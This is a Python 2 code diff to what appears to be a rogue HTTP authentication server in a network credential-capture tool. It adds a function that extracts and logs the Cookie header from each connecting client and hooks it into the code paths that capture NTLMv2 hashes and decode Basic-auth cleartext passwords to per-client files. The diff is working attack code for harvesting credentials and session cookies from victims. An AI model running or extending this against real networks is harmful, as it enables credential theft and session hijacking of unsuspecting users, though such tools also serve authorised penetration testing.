@@ -889,6 +889,16 @@ def ParseHTTPHash(data,client):
        print "Complete hash is : ", WriteHash
        logging.warning('[+]HTTP NTLMv2 Complete hash is :%s'%(WriteHash))
 
+def GrabCookie(data,host):
+    Cookie = re.search('(Cookie:*.\=*)[^\r\n]*', data)
+    if Cookie:
+          CookieStr = "[+]HTTP Cookie Header sent from: %s was: %s"%(host,Cookie.group(0))
+          logging.warning(CookieStr)
+          print CookieStr
+    else:
+          NoCookies = "[+]No cookies were sent with this request"
+          logging.warning(NoCookies)
+
 # Function used to check if we answer with a Basic or NTLM auth. 
 def Basic_Ntlm(Basic):
     if Basic == "1":
@@ -903,6 +913,7 @@ def PacketSequence(data,client):
     if a:
        packetNtlm = b64decode(''.join(a))[8:9]
        if packetNtlm == "\x01":
+          GrabCookie(data,client)
           r = NTLM_Challenge()
           r.calculate()
           t = IIS_NTLM_Challenge_Ans()
@@ -913,6 +924,7 @@ def PacketSequence(data,client):
           NTLM_Auth= b64decode(''.join(a))
           ParseHTTPHash(NTLM_Auth,client)
     if b:
+       GrabCookie(data,client)
        outfile = "HTTP-Clear-Text-Password-"+client+".txt"
        WriteData(outfile,b64decode(''.join(b)))
        print "[+]HTTP-User & Password:", b64decode(''.join(b))
@@ -931,6 +943,7 @@ class HTTP(SocketServer.BaseRequestHandler):
 
     def handle(self):
         try:
+             
             for x in range(2):
               data = self.request.recv(8092)
               buffer0 = PacketSequence(data,self.client_address[0])      
